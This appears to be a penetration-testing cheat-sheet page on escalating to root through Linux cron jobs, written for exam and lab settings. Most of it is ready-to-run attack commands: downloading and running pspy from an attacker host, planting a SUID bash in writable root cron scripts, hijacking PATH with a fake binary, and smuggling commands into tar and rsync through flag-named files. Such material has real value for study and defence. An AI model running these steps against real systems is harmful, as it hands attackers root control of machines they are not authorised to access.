---
id: linux-cron
title: Linux Cron Abuse
stage: privesc
tags: [linux]
summary: Find cron jobs running as root that use writable scripts or call binaries without full paths — any write access to what root runs is a path to root.
leads_to:
  - root-linux
---

## Prerequisites

A low-privilege shell. `pspy64` (transfer from attacker) to monitor hidden cron jobs. Write access to at least one script or directory in the cron execution path.

Cron jobs are one of the most common Linux privesc paths in exam environments — an admin schedules a root-owned script in a world-writable location, or a cron script calls a binary by bare name without a full path. The key tool is `pspy`: it monitors process creation without root and catches cron jobs that don't appear in any crontab file (systemd timers, user crontabs, etc.).

## Quick Win

> Check crontab for writable scripts, then run pspy to catch everything else.

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

## Writable Script

> If a root cron runs a script you can write to — append a shell command and wait.

```bash
# Append SUID bash (survives the cron run, then exploit manually)
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh

# After cron fires:
/bin/bash -p
```

## PATH Hijack via Cron

> If a cron script calls a binary by bare name — plant your binary in a directory earlier in PATH.

```bash
# If cron PATH starts with /tmp or you can prepend it:
export PATH=/tmp:$PATH

cat > /tmp/backup << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/backup
# Wait for cron → /bin/bash -p
```

## Wildcard Injection (tar)

> tar interprets filenames that look like flags — plant them in the target directory.

```bash
# If cron runs: cd /var/backup && tar czf backup.tar.gz *
echo "" > /var/backup/--checkpoint=1
echo "" > "/var/backup/--checkpoint-action=exec=bash shell.sh"
echo 'chmod +s /bin/bash' > /var/backup/shell.sh
chmod +x /var/backup/shell.sh
# Wait for cron → /bin/bash -p
```

## Wildcard Injection (rsync)

> rsync also interprets flag-named files — same technique, different flags.

```bash
# If cron runs: rsync -a /opt/backup/* user@host:/remote/
touch '/opt/backup/-e sh shell.sh'
echo 'chmod +s /bin/bash' > /opt/backup/shell.sh
chmod +x /opt/backup/shell.sh
```

## Leads To

Cron script modified → SUID bash planted → `/bin/bash -p` → root-linux. Wildcard injection fires → SUID or reverse shell → root. PATH hijack succeeds → custom binary runs as root → root-linux. Always watch pspy for 1-2 minutes — many jobs run every minute.
